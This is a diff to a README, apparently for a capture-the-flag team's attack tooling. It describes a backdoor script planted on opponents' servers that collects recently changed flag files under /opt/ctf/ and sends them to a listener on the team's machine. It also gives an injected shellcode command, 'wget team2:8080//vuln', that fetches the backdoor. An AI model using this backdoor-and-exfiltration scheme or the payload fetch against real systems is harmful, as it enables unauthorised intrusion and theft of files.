@@ -1,4 +1,18 @@
-How to run flg_mntr.py
-----------------------
+How to run backdoor.sh and server.py (also included shellcode!!)
+----------------------------------------------------------------
 
-# flg_mntr.py takes a batch of the most recently changed files within the past 3 minutes and "brute forces" the system by sending all the possible "flags" and sending it to our server for automatic submission
+backdoor.sh and server.py are two scripts that make a majority of our attack plan. The idea behind backdoor.sh is to have it lying on the victim servers monitoring which flags in the file system are being updated, and to grab all of them and feed them to server.py (running on our machines and listening on port 8888) which will then proceed to automatically submit them. 
+
+To run backdoor.sh:
+------------------------
+$sh backdoor.sh
+
+backdoor.sh will begin running 'find -cmin -3' on the directory /opt/ctf/ and any subdirectories that we specify such as /rw/, meaning the any services within /opt/ctf/ that contain the directory /rw/ will be searched. We grab the most recently touched files within the past 3 minutes and essentially submit them all through server.py
+
+To run server.py
+------------------------
+$python server.py
+
+server.py will begin listening on port 8888 and is meant to be run on the attacker's machine. Assuming a shellcode with the command 'wget team2:8080//vuln' is injected into a vulnerable service, server.py will begin sending our malicious backdoor.sh to the victim machine, effectively installing it on their machine. Next, server.py will beginning waiting for HTTP GET requests that contain flags in the URI. server.py will then parse it and submit the flags. 
+
+
